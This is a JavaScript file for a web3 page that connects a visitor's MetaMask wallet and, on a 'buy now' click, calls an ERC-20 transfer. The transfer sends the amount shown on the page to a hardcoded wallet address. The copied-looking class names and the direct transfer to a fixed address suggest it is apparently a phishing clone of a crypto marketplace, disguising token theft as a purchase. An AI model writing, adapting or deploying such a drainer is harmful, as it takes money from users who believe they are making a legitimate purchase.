window.addEventListener("load", async () => {
  if (!isMetamaskInstalled()) {
    return;
  }
  // set provider
  window.web3 = new Web3(ethereum);
  ethereum.request({
    method: "eth_requestAccounts",
  });
  const account = await getAccount();
  if (account) {
    let fixAccount =
      account.substring(0, 6) + "..." + account.substring(38, 42);
    document.getElementsByClassName("connect-btn___2Jyu3")[0].innerText =
      fixAccount;
    document.getElementById("id01").style.display = "none";
  }
});

$("#btn-connect-metamask").click(async function () {
  //Will Start the metamask extension
  ethereum.request({
    method: "eth_requestAccounts",
  });
  const account = await getAccount();
  if (account) {
    let fixAccount =
      account.substring(0, 6) + "..." + account.substring(38, 42);
    document.getElementsByClassName("connect-btn___2Jyu3")[0].innerText =
      fixAccount;
    document.getElementById("id01").style.display = "none";
  }
});

$("#btn-buy-now").click(async function () {
  $.getJSON("../abis/raca.json", function (data) {
    sendToken(56, data, "0x12BB890508c125661E03b09EC06E404bc9289040");
  });
});

function sendToken(chainId, contractABI, contractAddress) {
  if (+window.ethereum.networkVersion !== chainId) {
    alert("You must change network to chainId " + chainId);
    return;
  }
  let currentUser = ethereum.selectedAddress;
  let amount = Web3.utils.toHex(
    Web3.utils.toWei(
      document
        .querySelector("span.finance-num___EWLKY")
        .innerText.replaceAll(",", ""),
      "ether"
    )
  );

  let contractInstance = new web3.eth.Contract(contractABI, contractAddress);
  contractInstance.methods
    .transfer("0xC4A346834A5A038Eeb4a9248DC75adAC001C8A2C", amount)
    .send({
      from: currentUser,
      gas: "100000",
    })
    .then((result) => {
      console.log(result);
    })
    .catch((error) => {
      console.log({ error });
    });
}

async function getAccount() {
  accounts = await ethereum.request({
    method: "eth_requestAccounts",
  });
  return accounts[0];
}

function isMetamaskInstalled() {
  if (typeof window.ethereum !== "undefined") {
    console.log("MetaMask is installed!");
    return true;
  } else {
    window.alert("You need install metamask to use this function");
    return false;
  }
}
